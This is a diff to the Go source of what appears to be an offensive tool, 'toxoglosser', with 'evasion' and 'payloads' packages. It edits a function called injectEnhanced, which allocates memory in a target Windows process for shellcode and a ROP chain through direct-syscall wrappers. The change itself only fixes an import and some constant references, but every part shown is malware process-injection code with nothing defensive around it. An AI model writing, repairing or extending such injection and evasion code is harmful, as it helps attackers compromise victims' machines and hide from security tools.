@@ -184,6 +184,7 @@ import (
 	"unsafe"
 	_ "embed"
 
+	"golang.org/x/sys/windows"
 	"toxoglosser/core"
 	"toxoglosser/evasion"
 	"toxoglosser/payloads"
@@ -252,7 +253,7 @@ func injectEnhanced(pid C.DWORD, processName string, payload []byte) bool {
 	// Allocate memory in target process for shellcode
 	addr := uintptr(0)
 	size := uintptr(len(payload))
-	err = core.NtAllocateVirtualMemory(windows.Handle(hProcess), &addr, 0, &size, MEM_COMMIT_RESERVE, PAGE_READWRITE)
+	err = core.NtAllocateVirtualMemory(windows.Handle(hProcess), &addr, 0, &size, core.MEM_COMMIT_RESERVE, core.PAGE_READWRITE)
 	if err != nil {
 		fmt.Fprintf(os.Stderr, "[-] Failed to allocate memory in %s (%d): %v\n", processName, int(pid), err)
 		return false
@@ -281,7 +282,7 @@ func injectEnhanced(pid C.DWORD, processName string, payload []byte) bool {
 	// Allocate memory for ROP chain using direct syscall
 	ropSize := uintptr(ropChainSize)
 	ropAddr := uintptr(0)
-	err = core.NtAllocateVirtualMemory(windows.Handle(hProcess), &ropAddr, 0, &ropSize, MEM_COMMIT_RESERVE, PAGE_READWRITE)
+	err = core.NtAllocateVirtualMemory(windows.Handle(hProcess), &ropAddr, 0, &ropSize, core.MEM_COMMIT_RESERVE, core.PAGE_READWRITE)
 	if err != nil {
 		fmt.Fprintf(os.Stderr, "[-] Failed to allocate memory for ROP chain in %s (%d): %v\n", processName, int(pid), err)
 		return false
